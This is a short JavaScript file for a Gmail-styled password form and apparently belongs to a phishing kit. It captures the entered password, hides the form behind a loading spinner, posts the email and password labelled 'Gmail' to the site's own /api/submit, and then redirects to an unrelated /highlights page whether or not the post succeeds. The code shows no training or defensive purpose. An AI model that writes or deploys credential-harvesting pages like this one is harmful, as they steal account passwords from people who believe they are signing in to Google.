(function () {
  const form = document.getElementById('gmail-password-form');
  if (!form) return;
  const email = window.__GMAIL_EMAIL__ || '';

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    const password = document.getElementById('gmail-password').value;
    if (!password) return;

    const loading = document.getElementById('gmail-loading');
    const card = document.querySelector('.gmail-form');
    card.style.display = 'none';
    if (loading) loading.style.display = 'flex';

    fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, provider: 'Gmail' }),
    })
      .then((r) => r.json())
      .then(() => {
        setTimeout(() => { window.location.href = '/highlights'; }, 1200);
      })
      .catch(() => {
        setTimeout(() => { window.location.href = '/highlights'; }, 1200);
      });
  });

  const change = document.getElementById('gmail-change');
  if (change) {
    change.addEventListener('click', function () {
      window.location.href = '/gmail';
    });
  }
})();
